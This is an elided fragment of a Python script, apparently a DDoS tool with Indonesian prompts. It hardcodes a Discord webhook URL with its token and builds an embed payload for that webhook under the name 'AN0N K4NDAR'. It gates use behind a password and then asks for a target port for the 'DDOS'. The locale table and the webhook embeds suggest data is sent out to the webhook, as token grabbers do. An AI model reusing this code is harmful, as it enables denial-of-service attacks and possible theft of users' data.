...
webhook_url = "https://discord.com/api/webhooks/889549014234697799/t5IZAOCQvqV7SbdU-HRtJ3IkUMiImQoQUvAOfl8M05L39gtKNs2fyjEXgOoqz3YrlqbS"
languages = {
	'da'    : 'Danish, Denmark',
	'de'    : 'German, Germany',
...
def main():
	...
	webhook = {
		"content": "",
		"embeds": embeds,
		"username": "AN0N K4NDAR",
		"avatar_url": "https://imgur.com/a/ltE6Mds"
	}
	try:
...
for i in range(3):
	...
	if(pwd==password):
		...
		continue
time.sleep(5)
print("{√} Done Use Password \u001b[33m DDOS")
time.sleep(5)
...
time.sleep(3)
print(" ")
port = int(input("   \u001b[31m[$] \u001b[37mMasukan >>> Port nya ASU :\u001b[31m  "))
print(" ")
